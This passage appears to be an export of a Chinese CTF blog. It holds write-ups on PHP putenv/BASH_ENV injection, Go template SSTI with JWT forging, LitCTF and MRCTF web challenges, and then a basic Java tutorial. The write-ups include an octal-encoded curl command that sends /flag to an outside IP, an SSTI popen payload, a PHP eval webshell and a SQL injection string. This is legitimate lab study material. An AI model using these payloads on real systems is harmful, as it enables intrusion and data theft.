&amp;&amp; bye($v, &quot;/[a-zA-Z]/i&quot;)) &#123;            putenv(&quot;&#123;$k&#125;=&#123;$v&#125;&quot;);        &#125;    &#125;    system(&quot;bash -c &#x27;imdude&#x27;&quot;);        foreach($_GET[&quot;env&quot;] as $k=&gt;$v)&#123;        if(bye($k, &quot;/=/i&quot;)) &#123;            putenv(&quot;&#123;$k&#125;&quot;);        &#125;    &#125;    highlight_file(__FILE__);?&gt; \n\n话说这个题目的附件是源码和Docker文件，但是好像没什么用\n这个题目我实在没有想到会这么难，题目很短，题解也很短，但是关于我们如何利用bash -c配合环境变量进行命令执行，大佬的文章是看不懂的，我就算看几天也看不懂，只能抄一下结论了\n题目的代码主要以putenv函数为主进行了过滤，我们先来看putenv函数\nputenv() 是 PHP 中用于设置环境变量的函数，它可以添加或修改当前进程的环境变量。\nbool putenv ( string $setting )\n\n\n$setting - 要设置的环境变量字符串，格式为 &quot;name=value&quot;\n返回值：成功返回 true，失败返回 false\n\n我们根据以前的经验可以知道，在命令行中输入环境变量会执行可运行文件，但是我们题目中并没有机会给我们运行我们传入的环境变量，而是运行了一个imdude这个对解题没什么用\n看了大佬的文章后直接抄结论\n经过阅读dash和bash的代码，我发现了这样一些可以导致命令注入的环境变量：\n\nBASH_ENV：可以在bash -c的时候注入任意命令\nENV：可以在sh -i -c的时候注入任意命令\nPS1：可以在sh或bash交互式环境下执行任意命令\nPROMPT_COMMAND：可以在bash交互式环境下执行任意命令\nBASH_FUNC_xxx%%：可以在bash -c或sh -c的时候执行任意命令\n\n需要注意的是这里的dash不是Ptyhon的框架而是和bash一样都是\nShell（命令行解释器）是 Linux&#x2F;Unix 系统的核心组件，用于执行用户输入的命令、运行脚本和管理系统。dash 和 bash 是两种不同的 Shell，它们在功能、性能和用途上有显著区别。\n在debian系操作系统中，sh指向dash；在centos系操作系统中，sh指向bash。\n但是我们这次执行代码的是bash -c，也就是需要对BASH_ENV进行注入，当调用bash -c的时候就可以进行命令执行了\n接下来就是想办法绕过过滤了，过滤了等号和字母。这种情况要么使用取反和异或使用不可见字符，要么使用进制绕过。\n由于Bash中不能直接啊异或和取反就只有进制绕过了\n在Bash中，**$&#39;...&#39;** 是一种特殊的字符串语法（称为 ANSI-C Quoting），它允许使用转义序列来表示特殊字符。其中，八进制（\\nnn）、十六进制（\\xHH）和Unicode（\\uHHHH，\\UHHHHHHHH）都可以被解析。\n也就是我们可以通过这个方法使用八进制进行绕过，16进制和Unicode会出现字母不行，下面直接上脚本\nimport string# cmd = &quot;cat /flag&quot;cmd = &quot;cat /flag | curl -d @- http://10.88.15.172:7001&quot;str = &#x27;&#x27;for i in cmd:    if i in string.ascii_lowercase:        j = oct(ord(i))[2:]        str += &quot;$&#x27;\\\\&quot;+j+&quot;&#x27;&quot;    else:        str+=iprint(str)#$&#x27;\\143&#x27;$&#x27;\\141&#x27;$&#x27;\\164&#x27; /$&#x27;\\146&#x27;$&#x27;\\154&#x27;$&#x27;\\141&#x27;$&#x27;\\147&#x27; | $&#x27;\\143&#x27;$&#x27;\\165&#x27;$&#x27;\\162&#x27;$&#x27;\\154&#x27; -$&#x27;\\144&#x27; @- $&#x27;\\150&#x27;$&#x27;\\164&#x27;$&#x27;\\164&#x27;$&#x27;\\160&#x27;://10.88.15.172:7001#将所有的字母转化为八进制\n\n由于在python中使用oct(ord(‘a’))会有前缀0o，所以我们从下标为2开始截取，然后改变格式\n然后根据大佬的文章\n\n\n我们还需要使用命令执行符将其包裹，我们可以使用反引号和$()\n在Bash中，反引号（ ） 的作用是 命令替换（Command Substitution），它会将反引号内的命令执行，并将其标准输出的结果替换到当前位置。这是旧版Bash的语法，现代脚本更推荐使用 $( ) 的格式（功能相同，但嵌套更清晰）。\npayload\n$($&#x27;\\143&#x27;$&#x27;\\141&#x27;$&#x27;\\164&#x27; /$&#x27;\\146&#x27;$&#x27;\\154&#x27;$&#x27;\\141&#x27;$&#x27;\\147&#x27; | $&#x27;\\143&#x27;$&#x27;\\165&#x27;$&#x27;\\162&#x27;$&#x27;\\154&#x27; -$&#x27;\\144&#x27; @- $&#x27;\\150&#x27;$&#x27;\\164&#x27;$&#x27;\\164&#x27;$&#x27;\\160&#x27;://10.88.15.172:7001)`$&#x27;\\143&#x27;$&#x27;\\141&#x27;$&#x27;\\164&#x27; /$&#x27;\\146&#x27;$&#x27;\\154&#x27;$&#x27;\\141&#x27;$&#x27;\\147&#x27; | $&#x27;\\143&#x27;$&#x27;\\165&#x27;$&#x27;\\162&#x27;$&#x27;\\154&#x27; -$&#x27;\\144&#x27; @- $&#x27;\\150&#x27;$&#x27;\\164&#x27;$&#x27;\\164&#x27;$&#x27;\\160&#x27;://10.88.15.172:7001`\n\n\n"},{"title":"[LineCTF2022]gotm","url":"/2025/06/09/LineCTF2022-gotm/","content":"[LineCTF2022]gotm这个靶场进去什么都没有，但是题目给了源码，直接拿来看，结果是go写的，真的不熟，但是看了题解后发现还是可以看一下的，发现考的是SSTI和JWT。\n我们直接看main.go\npackage mainimport (\t&quot;encoding/json&quot;\t&quot;fmt&quot;\t&quot;log&quot;\t&quot;net/http&quot;\t&quot;os&quot;\t&quot;text/template&quot;\t&quot;github.com/golang-jwt/jwt&quot;)type Account struct &#123;\tid         string\tpw         string\tis_admin   bool\tsecret_key string&#125;type AccountClaims struct &#123;\tId       string `json:&quot;id&quot;`\tIs_admin bool   `json:&quot;is_admin&quot;`\tjwt.StandardClaims&#125;type Resp struct &#123;\tStatus bool   `json:&quot;status&quot;`\tMsg    string `json:&quot;msg&quot;`&#125;type TokenResp struct &#123;\tStatus bool   `json:&quot;status&quot;`\tToken  string `json:&quot;token&quot;`&#125;//一堆结构体var acc []Accountvar secret_key = os.Getenv(&quot;KEY&quot;)var flag = os.Getenv(&quot;FLAG&quot;)var admin_id = os.Getenv(&quot;ADMIN_ID&quot;)var admin_pw = os.Getenv(&quot;ADMIN_PW&quot;)func clear_account() &#123;\tacc = acc[:1]&#125;func get_account(uid string) Account &#123;\tfor i := range acc &#123;\t\tif acc[i].id == uid &#123;\t\t\treturn acc[i]\t\t&#125;\t&#125;\treturn Account&#123;&#125;&#125;func jwt_encode(id string, is_admin bool) (string, error) &#123;\tclaims := AccountClaims&#123;\t\tid, is_admin, jwt.StandardClaims&#123;&#125;,\t&#125;\ttoken := jwt.NewWithClaims(jwt.SigningMethodHS256, claims)\treturn token.SignedString([]byte(secret_key))&#125;func jwt_decode(s string) (string, bool) &#123;\ttoken, err := jwt.ParseWithClaims(s, &amp;AccountClaims&#123;&#125;, func(token *jwt.Token) (interface&#123;&#125;, error) &#123;\t\treturn []byte(secret_key), nil\t&#125;)\tif err != nil &#123;\t\tfmt.Println(err)\t\treturn &quot;&quot;, false\t&#125;\tif claims, ok := token.Claims.(*AccountClaims); ok &amp;&amp; token.Valid &#123;\t\treturn claims.Id, claims.Is_admin\t&#125;\treturn &quot;&quot;, false&#125;func auth_handler(w http.ResponseWriter, r *http.Request) &#123;\tuid := r.FormValue(&quot;id&quot;)\tupw := r.FormValue(&quot;pw&quot;)//拿到传参\tif uid == &quot;&quot; || upw == &quot;&quot; &#123;\t\treturn\t&#125;\tif len(acc) &gt; 1024 &#123;\t\tclear_account()\t&#125;    user_acc := get_account(uid)//通过get_account进行id查找\tif user_acc.id != &quot;&quot; &amp;&amp; user_acc.pw == upw &#123;//我们即需要查找有结果，还需要查找到的pw和我们传入的pw一致\t\ttoken, err := jwt_encode(user_acc.id, user_acc.is_admin)//对我们查找到的账号进行jwt加密\t\tif err != nil &#123;\t\t\treturn\t\t&#125;\t\tp := TokenResp&#123;true, token&#125;\t\tres, err := json.Marshal(p)\t\tif err != nil &#123;\t\t&#125;\t\tw.Write(res)\t\treturn\t&#125;\tw.WriteHeader(http.StatusForbidden)\treturn&#125;func regist_handler(w http.ResponseWriter, r *http.Request) &#123;\tuid := r.FormValue(&quot;id&quot;)\tupw := r.FormValue(&quot;pw&quot;)\tif uid == &quot;&quot; || upw == &quot;&quot; &#123;\t\treturn\t&#125;\tif get_account(uid).id != &quot;&quot; &#123;\t\tw.WriteHeader(http.StatusForbidden)\t\treturn\t&#125;\tif len(acc) &gt; 4 &#123;\t\tclear_account()\t&#125;\tnew_acc := Account&#123;uid, upw, false, secret_key&#125;\tacc = append(acc, new_acc)\tp := Resp&#123;true, &quot;&quot;&#125;\tres, err := json.Marshal(p)\tif err != nil &#123;\t&#125;\tw.Write(res)\treturn&#125;func flag_handler(w http.ResponseWriter, r *http.Request) &#123;\ttoken := r.Header.Get(&quot;X-Token&quot;)\tif token != &quot;&quot; &#123;\t\tid, is_admin := jwt_decode(token)\t\tif is_admin == true &#123;//对我们传入的jwt数据进行解密，如果为true则给flag\t\t\tp := Resp&#123;true, &quot;Hi &quot; + id + &quot;, flag is &quot; + flag&#125;\t\t\tres, err := json.Marshal(p)\t\t\tif err != nil &#123;\t\t\t&#125;\t\t\tw.Write(res)\t\t\treturn\t\t&#125; else &#123;\t\t\tw.WriteHeader(http.StatusForbidden)\t\t\treturn\t\t&#125;\t&#125;&#125;func root_handler(w http.ResponseWriter, r *http.Request) &#123;\ttoken := r.Header.Get(&quot;X-Token&quot;)//会获取请求头中的X-Token\tif token != &quot;&quot; &#123;\t\tid, _ := jwt_decode(token)//进行jwt_decode\t\tacc := get_account(id)//应该是获取用户的id\t\ttpl, err := template.New(&quot;&quot;).Parse(&quot;Logged in as &quot; + acc.id)//这应该就是用于显示登录信息\t\tif err != nil &#123;\t\t&#125;\t\ttpl.Execute(w, &amp;acc)\t&#125; else &#123;\t\treturn\t&#125;&#125;func main() &#123;\tadmin := Account&#123;admin_id, admin_pw, true, secret_key&#125;\tacc = append(acc, admin)\thttp.HandleFunc(&quot;/&quot;, root_handler)\thttp.HandleFunc(&quot;/auth&quot;, auth_handler)\thttp.HandleFunc(&quot;/flag&quot;, flag_handler)\thttp.HandleFunc(&quot;/regist&quot;, regist_handler)\tlog.Fatal(http.ListenAndServe(&quot;0.0.0.0:11000&quot;, nil))&#125;\n\n简单看了下代码有四个路由，我们先慢慢来分析\n我们先看&#x2F;flag路由\nfunc flag_handler(w http.ResponseWriter, r *http.Request) &#123;\ttoken := r.Header.Get(&quot;X-Token&quot;)\tif token != &quot;&quot; &#123;\t\tid, is_admin := jwt_decode(token)\t\tif is_admin == true &#123;//对我们传入的jwt数据进行解密，如果为true则给flag\t\t\tp := Resp&#123;true, &quot;Hi &quot; + id + &quot;, flag is &quot; + flag&#125;\t\t\tres, err := json.Marshal(p)\t\t\tif err != nil &#123;\t\t\t&#125;\t\t\tw.Write(res)\t\t\treturn\t\t&#125; else &#123;\t\t\tw.WriteHeader(http.StatusForbidden)\t\t\treturn\t\t&#125;\t&#125;&#125;\n\n很简单，对我们请求头中X-Token进行解码，如果为true则给flag，可是我们看了jwt_decode这个函数\nfunc jwt_decode(s string) (string, bool) &#123;\ttoken, err := jwt.ParseWithClaims(s, &amp;AccountClaims&#123;&#125;, func(token *jwt.Token) (interface&#123;&#125;, error) &#123;\t\treturn []byte(secret_key), nil\t&#125;)\tif err != nil &#123;\t\tfmt.Println(err)\t\treturn &quot;&quot;, false\t&#125;\tif claims, ok := token.Claims.(*AccountClaims); ok &amp;&amp; token.Valid &#123;\t\treturn claims.Id, claims.Is_admin\t&#125;\treturn &quot;&quot;, false&#125;\n\n我们必须拿到token才能成功被解码\n我们再来看&#x2F; 这个路由\nfunc root_handler(w http.ResponseWriter, r *http.Request) &#123;\ttoken := r.Header.Get(&quot;X-Token&quot;)//会获取请求头中的X-Token\tif token != &quot;&quot; &#123;\t\tid, _ := jwt_decode(token)//进行jwt_decode\t\tacc := get_account(id)//应该是查找用户的id\t\ttpl, err := template.New(&quot;&quot;).Parse(&quot;Logged in as &quot; + acc.id)//这应该就是用于显示登录信息\t\tif err != nil &#123;\t\t&#125;\t\ttpl.Execute(w, &amp;acc)//如果没有出现报错则输出信息\t&#125; else &#123;\t\treturn\t&#125;&#125;\n\n对我们拿到token暂时没什么帮助\n再来看&#x2F;auth路由\nfunc auth_handler(w http.ResponseWriter, r *http.Request) &#123;\tuid := r.FormValue(&quot;id&quot;)\tupw := r.FormValue(&quot;pw&quot;)//拿到传参\tif uid == &quot;&quot; || upw == &quot;&quot; &#123;\t\treturn\t&#125;\tif len(acc) &gt; 1024 &#123;\t\tclear_account()\t&#125;    user_acc := get_account(uid)//通过get_account进行id查找\tif user_acc.id != &quot;&quot; &amp;&amp; user_acc.pw == upw &#123;//我们即需要查找有结果，还需要查找到的pw和我们传入的pw一致\t\ttoken, err := jwt_encode(user_acc.id, user_acc.is_admin)//对我们查找到的账号进行jwt加密\t\tif err != nil &#123;\t\t\treturn\t\t&#125;\t\tp := TokenResp&#123;true, token&#125;\t\tres, err := json.Marshal(p)\t\tif err != nil &#123;\t\t&#125;\t\tw.Write(res)\t\treturn\t&#125;\tw.WriteHeader(http.StatusForbidden)\treturn&#125;//结构体type TokenResp struct &#123;\tStatus bool   `json:&quot;status&quot;`\tToken  string `json:&quot;token&quot;`&#125;\n\n对我们的传入的id和pw进行一个检查，还是如果没出现报错，则会返回一个TokenResp的对象（json形式），里面存储了状态status,和jwt token，内容是id和是否为admin\n最后再来看&#x2F;register路由\nfunc regist_handler(w http.ResponseWriter, r *http.Request) &#123;\tuid := r.FormValue(&quot;id&quot;)\tupw := r.FormValue(&quot;pw&quot;)\tif uid == &quot;&quot; || upw == &quot;&quot; &#123;\t\treturn\t&#125;\tif get_account(uid).id != &quot;&quot; &#123;\t\tw.WriteHeader(http.StatusForbidden)\t\treturn\t&#125;\tif len(acc) &gt; 4 &#123;\t\tclear_account()\t&#125;\tnew_acc := Account&#123;uid, upw, false, secret_key&#125;\tacc = append(acc, new_acc)\tp := Resp&#123;true, &quot;&quot;&#125;\tres, err := json.Marshal(p)\tif err != nil &#123;\t&#125;\tw.Write(res)\treturn&#125;\n\n这个就是一个简单的注册功能\n我们先来看存在SSTI注入的地方\nhttp.HandleFunc(“&#x2F;“, root_handler)\nfunc root_handler(w http.ResponseWriter, r *http.Request) &#123;\ttoken := r.Header.Get(&quot;X-Token&quot;)\tif token != &quot;&quot; &#123;\t\tid, _ := jwt_decode(token)\t#从jwt中解析出id属性\t\tacc := get_account(id)\t#根据id，查找账户\t\ttpl, err := template.New(&quot;&quot;).Parse(&quot;Logged in as &quot; + acc.id) #acc.id存在SSTI\t\tif err != nil &#123;\t\t&#125;\t\ttpl.Execute(w, &amp;acc)\t&#125; else &#123;\t\treturn\t&#125;&#125;\n\n我们之前SSTI获取密钥都是通过&#123;&#123;config&#125;&#125;拿到的，但是这是go语言\n在 Go 的 text/template 或 html/template 中\n\n&#123;&#123;.&#125;&#125; 表示 当前作用域的根对象（即传入模板的数据对象本身）。\n如果传入的数据是字符串 &quot;hello&quot;，&#123;&#123;.&#125;&#125; 会直接渲染 &quot;hello&quot;。\n如果传入的是结构体，&#123;&#123;.FieldName&#125;&#125; 可访问其字段。\n\n\n\n常规思路可以注入&#123;&#123;.&#125;&#125;或&#123;&#123;.secret_key&#125;&#125;来读secret_key属性，但此处由于root_handler()函数得到的acc是数组中的地址，也就是get_account函数通过在全局变量acc数组中查找我们的用户，这种情况下直接注入&#123;&#123;.secret_key&#125;&#125;会返回空，所以此处只能用&#123;&#123;.&#125;&#125;来返回全部属性\n于是我们在&#x2F;界面进行注入就能拿到密钥\n于是思路就来了\n步骤一\n先注册账号\nid=&#123;&#123;.&#125;&#125;&amp;pw=pass\n\n\n\n步骤二\n通过&#x2F;auth拿到我们进行加密的json数据\n\n\n由于是我们自己注册的信息，所以可以直接过pw\n步骤三\n将我们拿到的json数据去到&#x2F;目录下X-Token去传递数据，进行SSTI注入拿到密钥\n\n\nthis_is_f4Ke_key\n\n\n\n步骤四\n将我们拿到的json数据和密钥去进行加密，将is_adminfalse改为true\n\n\n然后把这个数据传到&#x2F;flag下X-Token中拿到flag\n\n"},{"title":"LitCTF_2025复现","url":"/2025/09/10/LitCTF-2025%E5%A4%8D%E7%8E%B0/","content":"LitCTF_2025复现Web1.星愿信箱服了这个题目这么简单，复现花了我30金币，再这样下去就可以去要饭了\n题目就是一个很简单的SSTI输入框，然后把&#123;&#123;&#125;&#125;过滤掉了，直接随便丢一个payload进去就出flag了\n&#123;%print lipsum.__globals__[&#x27;__builtins__&#x27;][&#x27;__import__&#x27;](&#x27;os&#x27;)[&#x27;popen&#x27;](&#x27;whoami&#x27;).read()%&#125;\n\n还有就是cat也被过滤了\n\n\n\n\n2.easy_file这个题目也不是很难，但是我就止步与此，原因是进入题目就是一个登录框，搞了半天没想到是爆破密码，那岂不是字典不对的人就寄了\n而且密码就是\nadminpassword\n\n虽然在其他题目中遇到过，但是比赛时我还是没有登录进去\n爆破时需要注意抓包发现被base64编码了，需要bp设置一下编码\n登录进去后发现是一个文件上传界面，然后发现在登录界面的源代码下面有提示file查看头像\n上传文件发现只允许jpg文件，拿到路径后发现通过file参数访问文件会返回文件数据\n\n\n我们可以尝试文件包含，但是对我们的数据过滤了php，我们使用短标签即可\n&lt;?=@eval($_POST[&#x27;pass&#x27;]);?&gt;\n\n然后通过file参数进行文件包含然后命令执行\n\n\n这道题目做出来的人少估计在登录那里就卡住了\n3.easy_signin越来越不明白我当时比赛的时候为什么不尝试一下去写这个题目\n题目进入就是一个403的界面，然后使用dirsearch扫出存在login.html，访问发现是一个登录界面，查看页面源代码发现有一个链接指向api.js\n\n\n得到提示\n\n\n发现url处存在ssrf漏洞，虽然将php过滤掉了，但是我们可以使用大小写绕过读取源码\nphP://filter/convert.base64-encode/resource=/var/www/html/login.html#发现是一个前端代码没什么信息\n\n尝试读取/api/sys/urlcode.php得到\n&lt;?phperror_reporting(0);function curl($url)&#123;    $ch = curl_init();    curl_setopt($ch, CURLOPT_URL, $url);    curl_setopt($ch, CURLOPT_HEADER, 0);    curl_exec($ch);    curl_close($ch);&#125;$url = $_REQUEST[&#x27;url&#x27;];if($url)&#123;    $forbidden_protocols = [&#x27;ftp://&#x27;, &#x27;php://&#x27;, &#x27;zlib://&#x27;, &#x27;data://&#x27;, &#x27;glob://&#x27;, &#x27;phar://&#x27;, &#x27;ssh2://&#x27;, &#x27;rar://&#x27;, &#x27;ogg://&#x27;, &#x27;expect://&#x27;];    $protocol_block = false;    foreach ($forbidden_protocols as $proto) &#123;        if (strpos($url, $proto) === 0) &#123;              $protocol_block = true;            break;        &#125;    &#125;    $log_block = strpos($url, &#x27;.log&#x27;) !== false;          if ($protocol_block) &#123;        echo &quot;禁止访问：不允许使用 &#123;$proto&#125; 协议&quot;;    &#125; elseif ($log_block) &#123;        echo &quot;禁止访问：URL 包含 .log&quot;;    &#125; elseif (strpos($url, &#x27;login.php&#x27;) !== false || strpos($url, &#x27;dashboard.php&#x27;) !== false || strpos($url, &#x27;327a6c4304ad5938eaf0efb6cc3e53dc.php&#x27;) !== false) &#123;        echo &quot;看不见哦&quot;;    &#125; else &#123;        echo &quot;&lt;b&gt;&quot;.$url.&quot; 的快照如下：&lt;/b&gt;&lt;br&gt;&lt;br&gt;&quot;;        echo &quot;&lt;pre&gt;&quot;;        curl($url);        include($url);        echo &quot;&lt;/pre&gt;&quot;;    &#125;&#125;?&gt;\n\n发现最后一层过滤阻止我们访问327a6c4304ad5938eaf0efb6cc3e53dc.php，于是我们尝试直接通过静态目录访问拿到flag，不知道这个通过静态目录访问是否是预期解，至少flag有了\n\n"},{"title":"[MRCTF2020]Ezaudit","url":"/2025/04/27/MRCTF2020-Ezaudit/","content":"[MRCTF2020]Ezaudit界面是一个很完善的前端界面，全是英文，我也看不懂。但是越是完善的前端界面越不会有东西，我抓包发现什么都没有后，尝试www.zip成功下载源码\nindex.php\n&lt;?php header(&#x27;Content-type:text/html; charset=utf-8&#x27;);error_reporting(0);if(isset($_POST[&#x27;login&#x27;]))&#123;    $username = $_POST[&#x27;username&#x27;];    $password = $_POST[&#x27;password&#x27;];    $Private_key = $_POST[&#x27;Private_key&#x27;];    if (($username == &#x27;&#x27;) || ($password == &#x27;&#x27;) ||($Private_key == &#x27;&#x27;)) &#123;        // 若为空,视为未填写,提示错误,并3秒后返回登录界面        header(&#x27;refresh:2; url=login.html&#x27;);        echo &quot;用户名、密码、密钥不能为空啦,crispr会让你在2秒后跳转到登录界面的!&quot;;        exit;&#125;    else if($Private_key != &#x27;*************&#x27; )    &#123;        header(&#x27;refresh:2; url=login.html&#x27;);        echo &quot;假密钥，咋会让你登录?crispr会让你在2秒后跳转到登录界面的!&quot;;        exit;    &#125;    else&#123;        if($Private_key === &#x27;************&#x27;)&#123;        $getuser = &quot;SELECT flag FROM user WHERE username= &#x27;crispr&#x27; AND password = &#x27;$password&#x27;&quot;.&#x27;;&#x27;;         $link=mysql_connect(&quot;localhost&quot;,&quot;root&quot;,&quot;root&quot;);        mysql_select_db(&quot;test&quot;,$link);        $result = mysql_query($getuser);        while($row=mysql_fetch_assoc($result))&#123;            echo &quot;&lt;tr&gt;&lt;td&gt;&quot;.$row[&quot;username&quot;].&quot;&lt;/td&gt;&lt;td&gt;&quot;.$row[&quot;flag&quot;].&quot;&lt;/td&gt;&lt;td&gt;&quot;;        &#125;    &#125;    &#125;&#125; // genarate public_key function public_key($length = 16) &#123;    $strings1 = &#x27;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789&#x27;;    $public_key = &#x27;&#x27;;    for ( $i = 0; $i &lt; $length; $i++ )    $public_key .= substr($strings1, mt_rand(0, strlen($strings1) - 1), 1);    return $public_key;  &#125;  //genarate private_key  function private_key($length = 12) &#123;    $strings2 = &#x27;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789&#x27;;    $private_key = &#x27;&#x27;;    for ( $i = 0; $i &lt; $length; $i++ )    $private_key .= substr($strings2, mt_rand(0, strlen($strings2) - 1), 1);    return $private_key;  &#125;  $Public_key = public_key();  //$Public_key = KVQP0LdJKRaV3n9D  how to get crispr&#x27;s private_key???\n\n我们发现这里面跳转代码中提到了login.html，我们尝试访问发现是一个登录界面\n我们继续代码审计，发现我们登录需要密匙，密匙正确后username和passwd那存在sql注入漏洞，我们主要目的是拿到密匙\nfunction public_key($length = 16) &#123;    $strings1 = &#x27;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789&#x27;;    $public_key = &#x27;&#x27;;    for ( $i = 0; $i &lt; $length; $i++ )    $public_key .= substr($strings1, mt_rand(0, strlen($strings1) - 1), 1);    return $public_key;  &#125;  //genarate private_key  function private_key($length = 12) &#123;    $strings2 = &#x27;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789&#x27;;    $private_key = &#x27;&#x27;;    for ( $i = 0; $i &lt; $length; $i++ )    $private_key .= substr($strings2, mt_rand(0, strlen($strings2) - 1), 1);    return $private_key;  &#125;  $Public_key = public_key();  //$Public_key = KVQP0LdJKRaV3n9D  how to get crispr&#x27;s private_key???\n\n首先是通过两个函数拿到公匙和密匙，但是这里使用的是mt_rand()函数生成伪随机数，mt_rand是通过种子决定随机算法，所以在种子和随机字符串相同的情况下，生成的随机数也相同\n我们可以通过工具php_mt_seed算出种子，在此之前我们需要拿到工具的参数，通过相同种子生成的公匙去拿到对应的数字下标\ns = &#x27;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789&#x27;key = &#x27;KVQP0LdJKRaV3n9D&#x27;m = &#x27;&#x27;for i in key:    for j in range(len(s)):        if i == s[j]:            m += &quot;&#123;&#125; &#123;&#125; 0 &#123;&#125; &quot;.format(j,j,len(s)-1)print(m)\n\n我们把其丢到php_mt_seed中拿到种子1775196155\n\n\n我们使用拿到的种子去按照其函数去跑密匙即可，但是这个对php版本有限制，我们需要用php5\n&lt;?phpmt_srand(1775196155);//公钥function public_key($length = 16) &#123;    $strings1 = &#x27;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789&#x27;;    $public_key = &#x27;&#x27;;    for ( $i = 0; $i &lt; $length; $i++ )    $public_key .= substr($strings1, mt_rand(0, strlen($strings1) - 1), 1);    return $public_key;&#125;//私钥function private_key($length = 12) &#123;\t\t$strings2 = &#x27;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789&#x27;;\t$private_key = &#x27;&#x27;;\tfor ( $i = 0; $i &lt; $length; $i++ )\t$private_key .= substr($strings2, mt_rand(0, strlen($strings2) - 1), 1);\treturn $private_key;&#125;echo public_key();echo private_key();?&gt;//BNC8lyED7y8Pdyms3NxjlpuxSI5y//根据题目源代码，公匙先生成前面16位随机数，密匙则是后面12位随机数，我们拿后面12位\n\n我们根据sql拿到username=crispr，我们通过passwd进行万能密码\npayload\ncrispr1&#x27;or 1=1 #XuNhoueCDCGc\n\n"},{"title":"JAVA","url":"/2025/07/08/JAVA/","content":"JAVA前言又到了学习语言的时候了，上次在这学习语言还是Python和PHP。本来想在小破站上面看黑马的教程的，但是我实在低估了七十多个小时，光讲一些C语言中学过的东西就讲了几个小时，实在不敢听下去，等下睡着了。\n作为一条webU•ェ•*U，当然是直接菜鸟教程速成来得快\nHello World正所谓Hello World生万物，我们先来看下简单的代码，了解一下JAVA的程序格式\npublic class HelloWorld &#123;//定义一个类    public static void main(String[] args) &#123;//相当于C语言的main函数，是程序的入口        printMessage();  // 调用自定义方法    &#125;    // 自定义方法（体现类的行为）    public static void printMessage() &#123;//定义了一个方法        System.out.println(&quot;Hello World!&quot;);    &#125;&#125;//定义方法和类的区别在于方法中将class换为了static代表该方法属于类本身，而非类的实例（对象）。//void则是返回值\n\n (1) 类（Class）—— public class HelloWorld\n\n类是 Java 的基本单元，所有代码必须放在类中。\nHelloWorld 是一个类的名称，首字母通常大写（命名规范）。\npublic 表示这个类可以被其他类访问（访问修饰符）。\n\n(2) 方法（Method）—— main 方法\n\n方法是类的行为。main 是 Java 程序的固定入口方法。\npublic static void 是方法的修饰符和返回类型：\nstatic：表示该方法属于类本身，而非类的实例（对象）。\nvoid：表示方法没有返回值。\n\n\nString[] args：参数列表（用于接收命令行参数）。\n\n(3) 对象与静态方法\n\nSystem.out.println() 的底层逻辑：\nSystem 是一个预定义的类。\nout 是 System 类的静态成员（一个 PrintStream 对象）。\nprintln() 是 PrintStream 对象的方法。\n\n\n虽然代码没有显式创建对象，但实际使用了 Java 内置的对象\n\n然后就是我们创建的对象都会被封装到.class文件中，\n\n\n这是我出现的一个报错，意思就是public属性的类时类的名字必须要和文件名一致\n相应的一个java文件中不能同时包含两个**public 类**，这是 Java 的硬性规定。具体规则如\n\n\n会在out文件夹中生成一个.class文件去编译我们的类，而且我们可以看到在production文件夹下也有一个和我们项目名一样的文件夹JCTF，这也就是说编译出来的.calss文件路径也是和项目一致的\n1.数据类型java的数据类型和C语言差不多，直接抄菜鸟的来凑博客字数\nJava语言提供了八种基本类型。六种数字类型（四个整数型，两个浮点型），一种字符类型，还有一种布尔型。\nbyte：\n\nbyte 数据类型是8位、有符号的，以二进制补码表示的整数；\n最小值是 -128（-2^7）；\n最大值是 127（2^7-1）；\n默认值是 0；\nbyte 类型用在大型数组中节约空间，主要代替整数，因为 byte 变量占用的空间只有 int 类型的四分之一；\n例子：byte a &#x3D; 100，byte b &#x3D; -50。\n\nshort：\n\nshort 数据类型是 16 位、有符号的以二进制补码表示的整数\n最小值是 -32768（-2^15）；\n最大值是 32767（2^15 - 1）；\nShort 数据类型也可以像 byte 那样节省空间。一个short变量是int型变量所占空间的二分之一；\n默认值是 0；\n例子：short s &#x3D; 1000，short r &#x3D; -20000。\n\nint：\n\nint 数据类型是32位、有符号的以二进制补码表示的整数；\n最小值是 -2,147,483,648（-2^31）；\n最大值是 2,147,483,647（2^31 - 1）；\n一般地整型变量默认为 int 类型；\n默认值是 0 ；\n例子：int a &#x3D; 100000, int b &#x3D; -200000。\n\nlong：\n\nlong 数据类型是 64 位、有符号的以二进制补码表示的整数；\n最小值是 -9,223,372,036,854,775,808（-2^63）；\n最大值是 9,223,372,036,854,775,807（2^63 -1）；\n这种类型主要使用在需要比较大整数的系统上；\n默认值是 0L；\n例子： long a &#x3D; 100000L，long b &#x3D; -200000L。  “L”理论上不分大小写，但是若写成”l”容易与数字”1”混淆，不容易分辩。所以最好大写。\n\nfloat：\n\nfloat 数据类型是单精度、32位、符合IEEE 754标准的浮点数；\nfloat 在储存大型浮点数组的时候可节省内存空间；\n默认值是 0.0f；\n浮点数不能用来表示精确的值，如货币；\n例子：float f1 &#x3D; 234.5f。\n\ndouble：\n\ndouble 数据类型是双精度、64 位、符合 IEEE 754 标准的浮点数；\n浮点数的默认类型为 double 类型；\ndouble类型同样不能表示精确的值，如货币；\n默认值是 0.0d；\n例子：\n\ndouble   d1  = 7D ;double   d2  = 7.; double   d3  =  8.0; double   d4  =  8.D; double   d5  =  12.9867; \n\n7 是一个 int 字面量，而 7D，7. 和 8.0 是 double 字面量。\nboolean：\n\nboolean数据类型表示一位的信息；\n只有两个取值：true 和 false；\n这种类型只作为一种标志来记录 true&#x2F;false 情况；\n默认值是 false；\n例子：boolean one &#x3D; true。\n\nchar：\n\nchar 类型是一个单一的 16 位 Unicode 字符；\n最小值是 \\u0000（十进制等效值为 0）；\n最大值是 \\uffff（即为 65535）；\nchar 数据类型可以储存任何字符；\n例子：char letter &#x3D; ‘A’;。\n\n数据类型并不是完全等同于变量类型，比如空数据类型null，然后字符串类型String应该和C语言一样通过char拼接而成\n\n\n\n符号\n字符含义\n\n\n\n\\n\n换行 (0x0a)\n\n\n\\r\n回车 (0x0d)\n\n\n\\f\n换页符(0x0c)\n\n\n\\b\n退格 